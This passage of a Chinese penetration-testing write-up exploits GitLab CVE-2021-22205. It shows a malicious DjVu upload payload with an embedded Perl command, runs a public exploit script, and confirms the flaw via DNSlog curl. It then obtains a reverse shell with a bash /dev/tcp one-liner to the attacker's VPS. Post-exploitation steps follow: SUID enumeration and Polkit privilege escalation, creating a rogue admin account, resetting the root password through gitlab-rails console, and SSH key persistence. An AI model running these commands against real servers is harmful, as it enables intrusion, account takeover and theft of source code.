    Content-Disposition: form-data; name="file"; filename="test.jpg"
    Content-Type: image/jpeg
    AT&TFORM 疍JVMDIRM .? F ?蘅?!葢N?亿堣k锾,q领觧暯⒚"?FORM ^DJVUINFO 
    d INCL shared_anno.iff BG44 J 婃岜7?*? BG44 鹖BG44 
    FORM DJVIANTa P(metadata
    (Copyright "\
    " . qx{echo vakzz >/tmp/vakzz} . \
    " b ") )
这个下图是之前做的，所以找不文件了，内容都是一样，明白POST提交的数据包是什么内容即可。  
关于vulhub的poc.py脚本内容，数据也是和我们上面所发送的数据包一致：  
**3、完整复现**  
这里由于vulhub靶场的CVE-2021-22205靶场环境太过于局限，这里我重新拉取一个gitlab13.9的版本，操作如下：
    export GITLAB_HOME=/srv/gitlab
    sudo docker run --detach \
      --hostname gitlab.example.com \
      --publish 443:443 --publish 80:80 \
      --name gitlab \
      --restart always \
      --volume $GITLAB_HOME/config:/etc/gitlab \
      --volume $GITLAB_HOME/logs:/var/log/gitlab \
      --volume $GITLAB_HOME/data:/var/opt/gitlab \
      gitlab/gitlab-ce:13.9.1-ce.0
环境如下：  
浏览器访问本机IP:80即可成功访问到gitlab界面。需要设置密码，我这里随便设了一个。  
这里直接推荐Al1ex师傅的脚本（脚本原理与上面也是一样的）：  
这里有三种模式:  
验证模式：验证是否存在漏洞  
攻击模式：可以通过-c更改命令  
批量检测：若指纹识别得到多个gitlab，可以放入txt里面进行批量验证是否存在本漏洞。  
这里我们先验证目标漏洞是否存在：  
python CVE-2021-22205.py -v true -t   
返回漏洞存在：  
进一步通过DNSlog去验证：  
python CVE-2021-22205.py -a true -t  -c "curl
DNSlog地址"  
这里最好用自己的DNSlog，如果没有的可以使用这个平台：  
看一下结果，发现Dnslog接收到了来自目标主机的数据，说明漏洞确实存在：  
反弹shell  
首先在自己的VPS上监听端口  
nc -lvvp 5120  
python CVE-2021-22205.py -a true -t  -c "echo 'bash
-i >& /dev/tcp/自己VPS的IP/5120 0>&1' > /tmp/1.sh"
python CVE-2021-22205.py -a true -t  -c "chmod +x
/tmp/1.sh"
python CVE-2021-22205.py -a true -t  -c "/bin/bash
/tmp/1.sh"  
然后返回来看自己监听的VPS，可以看到已经得到一个shell了  
4、/ **后利用** /  
前面通过rce后拿到的默认是git用户，非root用户  
利用方式一：提权  
这里建议通过如polkit、脏牛等漏洞进行后一步提权。  
这里以Polkit权限提升为例：  
查看SUID可执行文件的命令：
    find / -user root -perm -4000 -print 2>/dev/null
    find / -perm -u=s -type f 2>/dev/null
    find / -user root -perm -4000 -exec ls -ldb {} \;
Linux Polkit权限提升漏洞（CVE-2021-4034）：  
通过查找是否存在/usr/bin/pkexec，来判断能否利用CVE-2021-4034提权  
提权之后  
方法一：添加管理员账户，登录gitlab页面。  
echo
'user=User.new;user.name="test";user.username="test";user.password="echo123456";user.password_confirmation="echo123456";user.email="PI:EMAIL";user.access_level="admin";user.confirmed_at
= Time.zone.now;user.save!' | gitlab-rails console  
方法二：重置管理员密码，登录gitlab页面。  
利用方式二：重置密码  
如果只想要访问gitlab项目，可以参考本地修复gitlab管理员密码的方法来替换管理员密码。  
先讲一下正常gitlab管理员重置密码：  
1.这里网上说在强调需要root进入容器然后才能进控制台，我这边反弹的shell git用户权限也可以直接进入控制台。使用以下命令启动Ruby on
Rails控制台  
gitlab-rails console -e production
2.等待一段时间，控制台加载完毕，有多种找到用户的方法，您可以搜索电子邮件或用户名。  
user = User.where(id: 1).first //由于管理员用户root为第一个用户，因此用户id为1；
3.现在更改密码，注意，必须同时更改密码和password_confirmation才能使其正常工作。  
user.password = '新密码'  
user.password_confirmation = '新密码'
4.最后别忘了保存更改。  
user.save
完整指令如下：
    root@971e942b7a70:/# gitlab-rails console -e production
    --------------------------------------------------------------------------------     Ruby:         ruby 2.7.4p191 (2021-07-07 revision a21a3b7d23) [x86_64-linux]
     GitLab:       14.3.0 (ceec8accb09) FOSS
     GitLab Shell: 13.21.0
     PostgreSQL:   12.7
    --------------------------------------------------------------------------------    Loading production environment (Rails 6.1.3.2)
    irb(main):001:0> user = User.where(id: 1).first
    => #
    irb(main):002:0> user.password = 'admin1234'
    => "admin1234"
    irb(main):004:0> user.password_confirmation = 'admin1234'
    => "admin1234"
    irb(main):005:0> user.save
    Enqueued ActionMailer::MailDeliveryJob (Job ID: 191a2ed7-0caa-4122-bd06-19c32bffc50c) to Sidekiq(mailers) with arguments: "DeviseMailer", "password_change", "deliver_now", {:args=>[#>]}
    => true
管理员root用户密码重置完毕，重置后的密码为admin1234。  
下面是我用刚刚的shell执行的效果：  
1、进入控制台：gitlab-rails console -e production  
注意注意：这里一定要等一等，网上的文章说这里会卡住，其实只是人家程序在加载  
2、找到root用户，一开始我也以为是爆错，心想凉凉了，结果最后是执行了的  
3、更改密码。  
user.password = 'admin1234'  
user.password_confirmation = 'admin1234'  
4、最后保存  
user.save  
5、回到登陆界面，输入root/admin1234。  
发现成功登录，可以得到gitlab平台上的源代码。  
**利用方式三：SSH免密登录**  
如果上面的第二种利用方式不行的话，可以尝试SSH免密登录这种方式  
查看/etc/passwd  
在 /etc/passwd 文件中，大家可以把最后这个字段理解为用户登录之后所拥有的权限。如果这里使用的是 bash
命令解释器，就代表这个用户拥有权限范围内的所有权限。Shell 命令解释器如果为 /sbin/nologin，那么，这个用户就不能登录了。  
可以看到，这里的gti用户具有ssh登录权限，可以通过向git用户写入公钥进行登录。  
由于SSH免密登录不是本文重点，想了解gitlab免密登录可以看这篇文章：  
**参考链接**  
**5、SSRF未授权（CVE-2021-22214）**  
**影响版本**  
10.5   
**6、CVE-2022-2185**  
详情请见：